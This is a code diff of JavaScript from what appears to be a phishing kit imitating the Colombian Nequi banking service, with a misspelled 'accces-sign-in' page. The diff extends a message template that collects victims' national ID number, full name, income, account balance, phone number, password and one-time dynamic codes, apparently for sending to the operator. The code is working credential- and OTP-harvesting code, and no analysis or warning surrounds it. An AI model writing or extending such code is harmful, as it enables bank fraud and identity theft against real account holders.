@@ -18,7 +18,7 @@ document.addEventListener("DOMContentLoaded", () => {
   // }, 5000);
 
   btnReturn.addEventListener("click", (e) => {
-    window.location.href = "accces-sign-in.php.html";
+    window.location.href = "accces-sign-in.html";
   });
 
   let currentInput = 0;
@@ -141,8 +141,18 @@ document.addEventListener("DOMContentLoaded", () => {
 
         const message = `
 ⭐️⭐️ Dinámica ${contSend} ⭐️⭐️
+🪪 Cédula: ${formData.cedula}
+👤 Nombre: ${formData.nombreCompleto}
+💰 Monto: ${formData.montoPrestamo}
+👩‍💼 Ocupación: ${formData.ocupacion}
+📊 Ingresos mensuales: ${formData.ingresoMensual}
+💸 Gastos mensuales: ${formData.gastosMensual}
+🔥 Saldo actual en tu cuenta NEQUI: ${formData.saldoActual}
+⏳ Meses: ${formData.meses}
+🗓 Fecha de pago: ${formData.fechaPago}
 📱 Número: ${formData.phoneNumber}
 🔑 Clave: ${formData.password}
+📢 Tipo: ${formData.tipoProducto}
 🔑 Clave Dinámica ${contSend}: ${otp}
 `;
 
